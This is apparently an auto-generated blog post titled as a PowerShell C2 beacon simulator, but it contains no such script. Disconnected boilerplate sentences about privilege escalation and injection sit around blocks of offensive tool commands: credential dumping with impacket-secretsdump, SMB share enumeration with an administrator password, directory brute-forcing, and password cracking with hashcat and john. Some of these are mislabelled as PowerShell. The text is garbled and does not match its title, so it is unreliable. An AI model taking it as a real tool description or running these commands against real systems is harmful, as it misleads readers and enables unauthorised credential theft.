---
TitleSEO: "C2 Beacon Simulator in PowerShell | ZureFX"
TitlePost: "C2 Beacon Simulator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for c2 beacon simulator. Built for security research and automation."
Keywords: "powershell, fuzzer, script, rust, automation, parser"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-620.html"
URL_IMAGES: ""
Date: "2025-01-21"
Tags: "PowerShell, Fuzzer, Script, Rust, Automation, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-620"
Permalink: "/scripting/script-c2-beacon-simulator-620.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `mimikatz`
- `hydra`
- `GetNPUsers`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.102.78
gobuster dir -u http://10.37.252.91/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.137.88/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
feroxbuster -h
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.123.146.198/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.75.145.62 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.87.134.218 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 2.53s
```
